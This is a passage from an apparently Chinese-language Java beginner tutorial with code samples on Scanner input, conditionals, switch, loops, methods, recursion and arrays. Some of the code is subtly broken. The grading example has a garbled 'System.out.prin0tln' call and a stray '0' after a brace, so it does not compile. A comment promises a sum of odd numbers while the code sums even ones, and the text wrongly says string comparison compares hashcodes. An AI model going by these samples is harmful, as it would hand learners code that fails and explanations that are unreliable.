IO流不进行关闭都会一直占用资源，要养成关闭的习惯</span></span><br><span class="line">        scanner.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221027214539898.png" alt="image-20221027214539898"></p>
</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建一个扫描器对象，用于接收键盘数据，System.in代表输入</span></span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;使用scanner进行输入&quot;</span>);</span><br><span class="line">        <span class="comment">// 通过Scanner类的next()与nextline()方法获得输入的字符串</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在读取前需要使用hasNext()与hasNextLine()判断用户是否输入的数据</span></span><br><span class="line">        <span class="keyword">if</span>(scanner.hasNext())&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> scanner.next();</span><br><span class="line">            System.out.println(<span class="string">&quot;用户输入的数据为&quot;</span>+str);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// IO流不进行关闭都会一直占用资源，要养成关闭的习惯</span></span><br><span class="line">        scanner.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221027212402678.png" alt="image-20221027212402678"></p>
<ul>
<li><p>进阶	&#x2F;&#x2F; 规则:一直循环记录用户的输入值，如果输入的不是数字则退出，记录输入的数字之和和平均值</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">double</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0.0</span>;</span><br><span class="line">        <span class="keyword">while</span>(scanner.hasNextDouble())&#123;</span><br><span class="line">            <span class="type">double</span> <span class="variable">x</span> <span class="operator">=</span> scanner.nextDouble();</span><br><span class="line">            m++;</span><br><span class="line">            sum+=x;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;输入的和为：&quot;</span>+sum);</span><br><span class="line">        System.out.println(<span class="string">&quot;输入的平均值为：&quot;</span>+(sum/m));</span><br><span class="line">        scanner.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221027222226336.png" alt="image-20221027222226336"></p>
</li>
</ul>
<h3 id="2、if-选择结构">1.2.2. 2、if 选择结构</h3><ul>
<li><p>if(条件表达式)，条件表达式可以不用&#x3D;&#x3D;true，条件表达式默认为真</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">tjpd</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">// 下列两个写法意义相同，可以看到提示flag is always true</span></span><br><span class="line">        <span class="keyword">if</span>(flag==<span class="literal">true</span>)&#123;&#125;</span><br><span class="line">        <span class="keyword">if</span>(flag)&#123;&#125;</span><br><span class="line">        <span class="comment">// 下面两个写法一样也相同</span></span><br><span class="line">        <span class="keyword">if</span>(flag==<span class="literal">false</span>)&#123;&#125;</span><br><span class="line">        <span class="keyword">if</span>(!flag)&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221025154119126.png" alt="image-20221025154119126">				</p>
</li>
<li><p>.equals()判断字符串是否相等</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Domo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> scanner.nextLine();</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入内容&quot;</span>);</span><br><span class="line">        <span class="comment">// equals判断字符串是否相等</span></span><br><span class="line">        <span class="keyword">if</span>(s.equals(<span class="string">&quot;hello&quot;</span>))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;输入的值相等&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;输入的值不相等&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        scanner.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221029173018174.png" alt="image-20221029173018174"></p>
<ul>
<li><p>if(){}	else if(){}	else</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Domo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;请输入学生的成绩&quot;</span>);</span><br><span class="line">        <span class="type">float</span> <span class="variable">s</span> <span class="operator">=</span> scanner.nextFloat();</span><br><span class="line">        <span class="keyword">if</span> (s&gt;<span class="number">85</span> &amp;&amp; s&lt;=<span class="number">100</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;优秀&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s&gt;<span class="number">70</span> &amp;&amp; s&lt;=<span class="number">85</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;良好&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s&gt;=<span class="number">60</span> &amp;&amp; s&lt;=<span class="number">70</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;及格&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s&lt;<span class="number">60</span> &amp;&amp; s&gt;=<span class="number">0</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;不及格&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.prin0tln(<span class="string">&quot;输入的数值有误&quot;</span>);</span><br><span class="line">        &#125;<span class="number">0</span></span><br><span class="line">        scanner.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221029174046707.png" alt="image-20221029174046707"></p>
</li>
</ul>
<h3 id="3、Switch-选择结构">1.2.3. 3、Switch 选择结构</h3><p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221029174520744.png" alt="image-20221029174520744"></p>
<ul>
<li>switch case</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Domo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">char</span> <span class="variable">grade</span> <span class="operator">=</span> <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        <span class="comment">// 通过break控制switch退出，不加的话会把整个switch case都执行完，default = else</span></span><br><span class="line">        <span class="keyword">switch</span> (grade)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">                System.out.println(<span class="string">&quot;优秀&quot;</span>);</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">                System.out.println(<span class="string">&quot;良好&quot;</span>);</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>:</span><br><span class="line">                System.out.println(<span class="string">&quot;合格&quot;</span>);</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">                System.out.println(<span class="string">&quot;不合格&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                System.out.println(<span class="string">&quot;未知错误&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221029180930800.png" alt="image-20221029180930800"></p>
<ul>
<li>比较字符串的实质，是在比较对象的hashcode，string类型是个对象</li>
</ul>
<h3 id="4、While-循环">1.2.4. 4、While 循环</h3><ul>
<li><p>while(布尔表达式){}，布尔表达式为真才会执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Domo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;=<span class="number">100</span>)&#123;</span><br><span class="line">            sum+=i;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(sum);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221029190502855.png" alt="image-20221029190502855"></p>
</li>
</ul>
<h3 id="5、Do-While循环">1.2.5. 5、Do While循环</h3><ul>
<li><p>do {}while(布尔表达式);</p>
</li>
<li><p>while与do while的区别</p>
<ul>
<li>while先判断后执行，do while先执行后判断</li>
<li>do while至少会执行一次]</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Domo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;while循环&quot;</span>);</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;========================&quot;</span>);</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;do while循环&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">while</span>(i&lt;<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221029194330104.png" alt="image-20221029194330104"></p>
</li>
</ul>
<h3 id="6、For-循环">1.2.6. 6、For 循环</h3><ul>
<li><p>for(初始化;布尔表达式;更新){}</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Domo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 计算0-100之间的奇数和</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span><span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">100</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span> ((i%<span class="number">2</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">                sum+=i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(sum);</span><br><span class="line">        System.out.println(<span class="string">&quot;=======================&quot;</span>);</span><br><span class="line">        <span class="comment">// 输出1-100之间能被5整除的数，并且每行输出3个</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;=<span class="number">100</span>;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(j%<span class="number">5</span>==<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(x%<span class="number">3</span>==<span class="number">0</span> &amp;&amp; x&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                    System.out.println();</span><br><span class="line">                &#125;</span><br><span class="line">                x++;</span><br><span class="line">                System.out.print(j+<span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221029202413413.png" alt="image-20221029202413413"></p>
</li>
<li><p>打印99乘法表</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Domo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">9</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=i;j++)&#123;</span><br><span class="line">                System.out.print(i+<span class="string">&quot;*&quot;</span>+j+<span class="string">&quot;=&quot;</span>+(i*j)+<span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221029203538540.png" alt="image-20221029203538540"></p>
</li>
</ul>
<h3 id="7、增强For循环">1.2.7. 7、增强For循环</h3><p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221029204056958.png" alt="image-20221029204056958"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Domo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> [] numbers = &#123;<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>,<span class="number">40</span>,<span class="number">50</span>&#125;;</span><br><span class="line">        <span class="comment">// 遍历数组的偷懒写法</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> x:numbers)&#123;</span><br><span class="line">            System.out.println(x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="8、break-continue-标签">1.2.8. 8、break,continue,标签</h3><p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221029212306844.png" alt="image-20221029212306844"></p>
<ul>
<li><p>break 强行退出循环</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Domo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">            System.out.println(i);</span><br><span class="line">            <span class="keyword">if</span> (i==<span class="number">7</span>)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;End！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221029223143431.png" alt="image-20221029223143431"></p>
</li>
<li><p>continue 终止某次循环</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Domo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;<span class="number">100</span>)&#123;</span><br><span class="line">            i++;</span><br><span class="line">            <span class="comment">// 当i是10的倍数时输出换行并终止此次循环</span></span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">10</span>==<span class="number">0</span>)&#123;</span><br><span class="line">                System.out.println();</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.print(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221029223452252.png" alt="image-20221029223452252"></p>
</li>
</ul>
<h3 id="9、打印三角形及Debug">1.2.9. 9、打印三角形及Debug</h3><ul>
<li>通过断点进行Debug调试，可以看到程序运行过程</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">triangle</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 打印一个1,3,5,7,9的对称三角形</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">5</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">5</span>;j&gt;=i;j--)&#123;</span><br><span class="line">                System.out.print(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=i;j++)&#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;i;j++)&#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221030211231886.png" alt="image-20221030211231886"></p>
<h2 id="方法">1.3. 方法</h2><h3 id="1、定义与调用">1.3.1. 1、定义与调用</h3><p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221030212002456.png" alt="image-20221030212002456"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> add(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">        System.out.println(sum);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 形参:用于定于;实参:实际调用传递的值</span></span><br><span class="line">    <span class="comment">// a和b为形参;1和2为实参</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2、重载">1.3.2. 2、重载</h3><p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221030213158537.png" alt="image-20221030213158537"></p>
<h3 id="3、命令行传参">1.3.3. 3、命令行传参</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 使用for遍历args.length的参数</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;args.length;i++)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;args[&quot;</span> + i + <span class="string">&quot;]:&quot;</span> +args[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221031204720300.png" alt="image-20221031204720300"></p>
<h3 id="4、可变参数（不定项参数）">1.3.4. 4、可变参数（不定项参数）</h3><p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221031213230563.png" alt="image-20221031213230563"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Demo01</span> <span class="variable">demo01</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Demo01</span>();</span><br><span class="line">        demo01.test(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">(<span class="type">int</span> ...i)</span>&#123;</span><br><span class="line">        <span class="comment">// 可变参数的实质就是数组，所以需要通过下标选取</span></span><br><span class="line">        System.out.println(i[<span class="number">0</span>]);</span><br><span class="line">        System.out.println(i[<span class="number">1</span>]);</span><br><span class="line">        System.out.println(i[<span class="number">2</span>]);</span><br><span class="line">        System.out.println(i[<span class="number">3</span>]);</span><br><span class="line">        System.out.println(i[<span class="number">4</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221031213836254.png" alt="image-20221031213836254"></p>
<h3 id="5、递归">1.3.5. 5、递归</h3><p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221031230634791.png" alt="image-20221031230634791"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">	<span class="comment">// 计算阶乘</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> func(<span class="number">5</span>);</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> n*func(n-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221031230556487.png" alt="image-20221031230556487"></p>
<h2 id="数组">1.4. 数组</h2><h3 id="1、声明与创建">1.4.1. 1、声明与创建</h3><ul>
<li><p>动态初始化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> [] num ;    <span class="comment">//  1、定义数组</span></span><br><span class="line">        <span class="type">int</span> num2 [];    <span class="comment">//  2、定义数组，推荐使用第一种，第二种是为了匹配C/C++才保留的</span></span><br><span class="line">        <span class="comment">// 使用new去调用数组</span></span><br><span class="line">        num = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];  <span class="comment">//  指定数组的大小为10，即可以存放10个int数字</span></span><br><span class="line">        <span class="comment">// 通过下标赋值,为动态初始化，length获取数组长度</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;num.length;i++)&#123;</span><br><span class="line">            num[i] = i;</span><br><span class="line">            System.out.println(num[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>静态初始化</p>
<p><code>int [] num3 = &#123;1,2,3,4,5&#125;;</code></p>
</li>
</ul>
<h3 id="2、基本特点">1.4.2. 2、基本特点</h3><p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221101212451457.png" alt="image-20221101212451457"></p>
<h3 id="3、数组的使用">1.4.3. 3、数组的使用</h3><ul>
<li><p>For-Each循环（增强For循环）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> [] array = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i : array) &#123;</span><br><span class="line">            System.out.println(i);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>将数组作为对象传入</p>
</li>
<li><p>讲数组作为返回值</p>
